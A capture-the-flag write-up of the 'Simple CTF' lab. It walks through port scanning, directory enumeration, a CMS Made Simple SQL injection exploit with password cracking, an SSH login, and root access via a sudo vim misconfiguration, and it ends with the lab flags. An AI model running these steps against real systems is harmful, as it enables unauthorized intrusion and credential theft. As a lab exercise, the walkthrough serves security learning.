# Simple CTF

Laurent Chauvin | October 31, 2022

## Resources

## Progress

```
export IP=10.10.246.205
```

Nmap scan:
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 00:34 EDT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.76% done; ETC: 00:35 (0:00:00 remaining)                                                                                                                                                                               
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                                                                  
NSE Timing: About 99.76% done; ETC: 00:35 (0:00:00 remaining)
Nmap scan report for 10.10.246.205
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.23.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds
                                                               
```

Search for OpenSSH exploit:
```
searchsploit OpenSSH

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                                                                                                                                      | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                                                                                                                        | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                                                                                                                          | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                                                                                                                                    | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                                                                                                        | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                                                                                                                | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                                                  | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                                            | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                                                                                                         | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                                                                                | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                                                                                                      | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                                                                                                      | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                                                                                                                | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                                                                                                                                      | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                                                                                                                           | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                                                                   | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                                                                      | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                                                              | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                                                                                                    | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                                                      | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                                                  | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                                                      | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                                                                                                                                                | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                                                                       | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                                                                         | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                                                                                                                                     | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                                                                                                      | multiple/remote/3303.sh
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Interesting one:
```
OpenSSH 7.2p2 - Username Enumeration                                                                                                                                                                      | linux/remote/40136.py
```

Get module:
```
searchsploit -m /remote/40136.py
```

Running the script to enumerate users ends with an error. Let's keep that for later. Let's focus on http server for now.

Running Gobuster:
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee goburster.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.246.205
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 00:49:03 Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 315] [--> http://10.10.246.205/simple/]
```

Running Nikto:
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.246.205
+ Target Hostname:    10.10.246.205
+ Target Port:        80
+ Start Time:         2022-10-31 00:49:37 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590523e6dfcd7, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
```

Index page show a default Apache page.

Robots.txt show this:
```
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

Visiting ```http://10.10.246.205/simple/``` show the default page after installation of a 'CMS Made Simple', version 2.2.8:
```
This site is powered by CMS Made Simple version 2.2.8
```

This CMS seems to have multiple exploits:
```
earchsploit CMS Made Simple          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                                                        | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                                                                                                   | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                                                                                                   | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                                                                                                | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                                                                                                    | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                   | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                                                         | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                                                                                                               | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                                                      | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                                                          | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                                                              | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                                                             | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                                                       | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                                                          | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                                                          | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                                                                                             | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                                                   | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                                                                                            | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                                                          | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                                                             | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                                                            | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                                              | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                                                  | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                                                                               | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                                              | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                                                  | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                                                             | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                                                             | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                                                                                           | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                  | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                                                          | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                                                     | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                                                            | php/webapps/46546.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This one could be relevant:
```
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                                                             | php/webapps/45793.py
```

Getting module:
```
searchsploit -m
```

The description reads:
```
# 1. Description:
# An attacker or a malicious user with access to the administration interface can execute code on the server.
```

Need admin priv first, but could potentially RCE after.

This line could be relevant then, leveraging CVE-2019-9053:
```
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                  | php/webapps/46635.py
```

Seems vulnerable to SQL injection (or SQLi).

Modified script to be compatible with Python3 (replaced print by print()), and replaced this line:
```
if hashlib.md5(str(salt) + line).hexdigest() == password:
```

by this one:
```
if hashlib.md5((str(salt) + line).encode('utf-8')).hexdigest() == password:
```


SQLi:
```
python3 46635.py -u "http://$IP/simple" --crack -w /opt/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

SSH:
```
ssh -p2222 mitch@$IP
```

Password: secret

```
cat user.txt

G00d j0b, keep up!
```

```
ls /home
mitch  sunbath
```

Look for privesc:
```
sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```
sudo vim /root/root.txt

W3ll d0n3. You made it!
```

## Flag


1. User

G00d j0b, keep up!

2. Privesc

W3ll d0n3. You made it!
